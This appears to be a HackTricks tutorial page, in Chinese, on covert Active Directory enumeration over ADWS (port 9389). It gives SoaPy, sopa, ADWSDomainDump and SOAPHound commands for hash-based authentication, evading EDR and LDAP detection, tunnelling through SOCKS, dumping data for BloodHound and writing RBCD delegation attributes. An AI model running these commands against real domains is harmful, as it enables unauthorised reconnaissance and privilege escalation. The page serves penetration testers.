# Active Directory Web Services (ADWS) 枚举与隐蔽收集

{{#include ../../banners/hacktricks-training.md}}

## 什么是 ADWS？

Active Directory Web Services (ADWS) 是 **自 Windows Server 2008 R2 起在每个域控制器上默认启用的服务**，并监听 TCP **9389**。尽管名称带有 Web，但 **不涉及 HTTP**。相反，该服务通过一套专有的 .NET 封装协议暴露类似 LDAP 的数据：

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量被封装在这些二进制 SOAP 帧内并通过一个不常见的端口传输，**通过 ADWS 进行的枚举比经典的 LDAP/389 & 636 流量更不易被检查、过滤或基于签名检测**。对操作人员而言，这意味着：

* 更隐蔽的侦察 — 蓝队通常关注 LDAP 查询。
* 可以通过将 9389/TCP 通过 SOCKS 代理隧道，从 **非 Windows 主机（Linux, macOS）** 进行数据收集。
* 可获取与 LDAP 相同的数据（users、groups、ACLs、schema 等），并能执行 **写入** 操作（例如设置 `msDs-AllowedToActOnBehalfOfOtherIdentity` 用于 **RBCD**）。

ADWS 交互基于 WS-Enumeration：每个查询以一个定义 LDAP 过滤器/属性并返回 `EnumerationContext` GUID 的 `Enumerate` 消息开始，随后是一个或多个 `Pull` 消息按服务器定义的结果窗口流式传输结果。上下文大约在 ~30 分钟后过期，因此工具要么需要对结果进行分页，要么拆分过滤器（对每个 CN 使用前缀查询）以避免丢失状态。当请求安全描述符时，指定 `LDAP_SERVER_SD_FLAGS_OID` 控制以省略 SACLs，否则 ADWS 会在其 SOAP 响应中直接丢弃 `nTSecurityDescriptor` 属性。

> NOTE: ADWS 也被许多 RSAT GUI/PowerShell 工具使用，因此流量可能与合法的管理员活动混合在一起。

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) 是对 ADWS 协议栈的 **用纯 Python 完全重实现**。它逐字节构造 NBFX/NBFSE/NNS/NMF 帧，允许在不触碰 .NET 运行时的情况下从类 Unix 系统进行收集。

### 主要特性

* 支持通过 SOCKS 进行**代理**（对 C2 负载很有用）。
* 与 LDAP `-q '(objectClass=user)'` 相同的细粒度搜索过滤器。
* 可选的 **写入** 操作（`--set` / `--delete`）。
* **BOFHound 输出模式**，可直接导入到 BloodHound。
* `--parse` 标志用于在需要人类可读性时美化时间戳 / `userAccountControl`。

### 目标化收集标志与写操作

SoaPy 附带了复刻最常见 LDAP 猎取任务的精选开关，用于通过 ADWS：`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds`，以及用于自定义提取的原始 `--query` / `--filter` 控件。将这些与写入原语配合使用，例如 `--rbcd <source>`（设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）、`--spn <service/cn>`（用于目标化 Kerberoasting 的 SPN 暂存）和 `--asrep`（在 `userAccountControl` 中翻转 `DONT_REQ_PREAUTH`）。

示例：仅返回 `samAccountName` 和 `servicePrincipalName` 的目标化 SPN 搜索：
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
使用相同的主机/凭据立即武器化发现：转储 RBCD-capable objects（使用 `--rbcds`），然后应用 `--rbcd 'WEBSRV01$' --account 'FILE01$'` 来搭建一个 Resource-Based Constrained Delegation 链（完整滥用路径见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump 通过 ADWS (Linux/Windows)

* 基于 `ldapdomaindump` 的一个 fork，将 LDAP 查询替换为通过 TCP/9389 的 ADWS 调用，以减少 LDAP 签名命中。
* 在首次运行时会对 9389 端口进行可达性检查，除非传入 `--force`（如果端口扫描噪声大或被过滤则跳过探测）。
* 在 README 中对 Microsoft Defender for Endpoint 和 CrowdStrike Falcon 进行了测试，并记录了成功绕过的情况。

### 安装
```bash
pipx install .
```
### 用法
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型输出会记录 9389 可达性检查、ADWS bind，以及 dump 开始/结束：
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - 一个用于 ADWS 的实用客户端（Golang）

类似于 soapy，[sopa](https://github.com/Macmod/sopa) 用 Golang 实现了 ADWS 协议栈 (MS-NNS + MC-NMF + SOAP)，并通过命令行参数暴露用于发起 ADWS 调用的功能，例如：

* **对象搜索与检索** - `query` / `get`
* **对象生命周期** - `create [user|computer|group|ou|container|custom]` 和 `delete`
* **属性编辑** - `attr [add|replace|delete]`
* **账号管理** - `set-password` / `change-password`
* 以及其他如 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 等。

### 协议映射要点

* LDAP-style 搜索通过 **WS-Enumeration** (`Enumerate` + `Pull`) 发起，支持属性投影、范围控制（Base/OneLevel/Subtree）和分页。
* 单对象获取使用 **WS-Transfer** `Get`；属性修改使用 `Put`；删除使用 `Delete`。
* 内置对象创建使用 **WS-Transfer ResourceFactory**；自定义对象使用由 YAML 模板驱动的 **IMDA AddRequest**。
* 密码操作为 **MS-ADCAP** 操作（`SetPassword`, `ChangePassword`）。

### 未认证的元数据发现 (mex)

ADWS 在不需要凭证的情况下公开 WS-MetadataExchange，这是在认证前验证暴露情况的一种快速方法：
```bash
sopa mex --dc <DC>
```
### DNS/DC 发现 & Kerberos 定位 说明

Sopa can resolve DCs via SRV if `--dc` is omitted and `--domain` is provided. 它按以下顺序查询并使用优先级最高的目标：
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
在实际操作中，优先使用由 DC 控制的解析器，以避免在分段网络环境中出现故障：

* 使用 `--dns <DC-IP>`，这样**所有** SRV/PTR/forward 查找都会通过 DC 的 DNS。
* 当 UDP 被阻止或 SRV 响应较大时，使用 `--dns-tcp`。
* 如果启用 Kerberos 且 `--dc` 是一个 IP，sopa 会执行 **反向 PTR** 以获取 FQDN，从而正确定位 SPN/KDC。如果不使用 Kerberos，则不会进行 PTR 查找。

示例（IP + Kerberos，强制通过 DC 的 DNS）：
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Auth 材料选项

除了明文密码之外，sopa 支持 **NT hashes**、**Kerberos AES keys**、**ccache** 和 **PKINIT certificates**（PFX 或 PEM）用于 ADWS auth。使用 `--aes-key`、`-c`（ccache）或基于证书的选项时，隐含使用 Kerberos。
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### 通过模板创建自定义对象

对于任意对象类，`create custom` 命令使用一个 YAML 模板，该模板映射到 IMDA 的 `AddRequest`：

* `parentDN` 和 `rdn` 定义容器和相对 DN。
* `attributes[].name` 支持 `cn` 或带命名空间的 `addata:cn`。
* `attributes[].type` 接受 `string|int|bool|base64|hex` 或显式 `xsd:*`。
* 不要包含 `ad:relativeDistinguishedName` 或 `ad:container-hierarchy-parent`; sopa 会注入它们。
* `hex` 值会被转换为 `xsd:base64Binary`；使用 `value: ""` 来设置空字符串。

## SOAPHound – 高吞吐量 ADWS 收集（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) 是一个 .NET 收集器，将所有 LDAP 交互保留在 ADWS 内部，并输出与 BloodHound v4 兼容的 JSON。它一次性构建 `objectSid`、`objectGUID`、`distinguishedName` 和 `objectClass` 的完整缓存（`--buildcache`），然后在高吞吐量的 `--bhdump`、`--certdump`（ADCS）或 `--dnsdump`（AD-integrated DNS）运行中重用该缓存，这样只有约 35 个关键属性会离开 DC。AutoSplit（`--autosplit --threshold <N>`）会按 CN 前缀自动分片查询，以在大型林中保持在 30 分钟的 EnumerationContext 超时限制以内。

在已加入域的操作员虚拟机上的典型工作流程：
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
导出的 JSON 可直接插入 SharpHound/BloodHound 工作流——参见 [BloodHound methodology](bloodhound.md) 获取下游图形化思路。AutoSplit 使 SOAPHound 在数百万对象的 forests 上更具弹性，同时将查询次数保持低于 ADExplorer 风格的快照。

## 隐蔽 AD 收集工作流

下面的工作流展示了如何通过 ADWS 枚举 **域 & ADCS 对象**，将它们转换为 BloodHound JSON，并从 Linux 上搜索基于证书的攻击路径：

1. **建立 9389/TCP 隧道** 从目标网络到你的机器（例如通过 Chisel、Meterpreter、SSH 动态端口转发等）。导出 `export HTTPS_PROXY=socks5://127.0.0.1:1080` 或使用 SoaPy 的 `--proxyHost/--proxyPort`。

2. **收集根域对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **从 Configuration NC 收集与 ADCS 相关的对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **转换为 BloodHound：**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **在 BloodHound GUI 中上传 ZIP** 并运行 cypher 查询，例如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 来揭示证书升级路径 (ESC1, ESC8 等)。

### 写入 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
将此与 `s4u2proxy`/`Rubeus /getticket` 结合，以完成一个完整的 **Resource-Based Constrained Delegation** 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

## 工具概览

| 目的 | 工具 | 说明 |
|---------|------|-------|
| ADWS 枚举 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| 大规模 ADWS 导出 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound 导入 | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| 证书妥协 | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS 枚举和对象更改 | [sopa](https://github.com/Macmod/sopa) | 通用客户端，用于与已知 ADWS 端点交互 - 支持枚举、创建对象、修改属性和更改密码 |

## 参考资料

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
